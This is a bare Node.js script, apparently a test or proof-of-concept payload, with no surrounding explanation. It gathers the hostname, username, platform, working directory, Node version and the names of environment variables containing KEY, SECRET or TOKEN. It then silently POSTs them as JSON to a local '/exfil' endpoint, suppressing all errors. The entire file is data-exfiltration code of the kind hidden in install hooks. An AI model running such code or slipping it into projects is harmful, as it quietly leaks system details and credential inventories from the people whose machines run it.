const http = require("http");
const os = require("os");
const data = JSON.stringify({
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  cwd: process.cwd(),
  nodeVersion: process.version,
  envKeys: Object.keys(process.env).filter(k => k.includes("KEY") || k.includes("SECRET") || k.includes("TOKEN")),
  timestamp: new Date().toISOString(),
  channel: "http"
});
const req = http.request({ hostname: "127.0.0.1", port: 3000, path: "/exfil", method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } }, () => {});
req.on("error", () => {});
req.write(data);
req.end();
